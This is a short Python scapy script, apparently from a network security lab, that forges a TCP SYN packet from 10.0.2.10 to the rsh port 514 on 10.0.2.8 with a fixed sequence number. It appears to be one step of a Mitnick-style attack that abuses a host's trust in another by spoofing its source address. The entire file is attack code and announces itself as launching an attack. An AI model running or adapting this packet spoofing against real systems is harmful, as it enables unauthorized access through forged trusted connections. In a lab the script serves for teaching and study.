
#!usr/bin/python3
from scapy.all import *
import sys

print("Attack is launched.. Now sending spoofed SYN packet ...")
IPLayer = IP(src="10.0.2.10", dst="10.0.2.8")
TCPLayer = TCP(sport=1023,dport=514,flags="S", seq=3371271375)
pkt = IPLayer/TCPLayer
send(pkt,verbose=0)
